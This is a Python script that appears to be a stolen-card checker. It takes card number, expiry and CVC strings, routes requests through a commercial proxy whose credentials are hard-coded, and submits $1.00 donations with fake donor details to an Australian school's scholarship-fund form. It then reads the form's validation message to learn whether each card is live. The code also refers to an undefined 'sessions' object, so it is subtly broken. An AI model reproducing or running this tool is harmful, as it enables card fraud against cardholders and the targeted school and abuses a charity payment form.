import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_b7987ef2-zone-mass:gvqtoo4v78v8"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
		mm = mm.split("0")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 3)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'www.stmichaels.vic.edu.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOPUScQ1YAZ6qBXLA',
	    'origin': 'https://www.stmichaels.vic.edu.au',
	    'referer': 'https://www.stmichaels.vic.edu.au/scholarship-fund/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	files = [
	    ('input_32', (None, '')),
	    ('input_30.3', (None, 'Gen')),
	    ('input_30.6', (None, 'Paypal')),
	    ('input_3', (None, 'genpaypal01@gmail.com')),
	    ('input_31.1', (None, '27 Allen St')),
	    ('input_31.3', (None, 'New York')),
	    ('input_31.4', (None, 'New York')),
	    ('input_31.5', (None, '10080')),
	    ('input_31.6', (None, 'United States')),
	    ('input_9', (None, '4303000850')),
	    ('input_10', (None, 'Current staff')),
	    ('input_14', (None, 'Choose Amount|0')),
	    ('input_27', (None, '$1.00')),
	    ('input_18.1', (None, f'{n}')),
	    ('input_18.2[]', (None, f'{mm}')),
	    ('input_18.2[]', (None, f'20{yy}')),
	    ('input_18.3', (None, f'{cvc}')),
	    ('input_18.5', (None, 'Gen Paypal')),
	    ('input_21', (None, '')),
	    ('input_28', (None, '1')),
	    ('gform_ajax', (None, 'form_id=1&title=&description=&tabindex=0&theme=legacy&styles=[]&hash=a8b2d398df14ac18d6e234371a51a969')),
	    ('gform_submission_method', (None, 'iframe')),
	    ('gform_theme', (None, 'legacy')),
	    ('gform_style_settings', (None, '[]')),
	    ('is_submit_1', (None, '1')),
	    ('gform_submit', (None, '1')),
	    ('gform_unique_id', (None, '6943d1311e43b')),
	    ('state_1', (None, 'WyJ7XCIxNFwiOltcIjkzMjI5MzMyZDk2MmRiMGI1NWIxMjg3YTNhOWI3OThkXCIsXCJkNmE4NGViNWQwMjgwOTIwMzJkYmFmZDJhZTIxM2NhOFwiLFwiYjU4ZWZkM2E3MWE0NmRmMTMwZTBhYTZhZDJjYzMyOTFcIixcIjRmZTI4ZTFiMGVhMjk2OGVlNzVmM2VlMjE2NjI0ODQ2XCIsXCI1NTZhOTY3ZmQzYjM5M2YzZWFmNjNjZjc3YjYwMDViOVwiLFwiMzYwYjQ2YzVhODI1YjY0MzczYjk4ODIwN2ZlYWU0NWVcIixcIjIxYWZiZGUwMjI5NDYyNThmMTFmOTA2YTY0OWU2MTkyXCJdfSIsIjY3YTAwNzQ1NThkNWY1NDQ2NjM0NDFkYzg3MjUxODQyIl0=')),
	    ('gform_target_page_number_1', (None, '0')),
	    ('gform_source_page_number_1', (None, '1')),
	    ('gform_field_values', (None, '')),
	    ('version_hash', (None, 'f72b951c73c11f86bd87dad208223300')),
	    ('gform_submission_speeds', (None, '{"pages":{"1":[78370]}}')),
	]
	
	response = sessions.post('https://www.stmichaels.vic.edu.au/scholarship-fund/', headers=headers, files=files)
	
	try:
		result = re.search(r"class='gfield_description validation_message gfield_validation_message'>(.*?)<\/div><\/li>", response.text).group(1)
	except:
		result = response.text
	
	return result
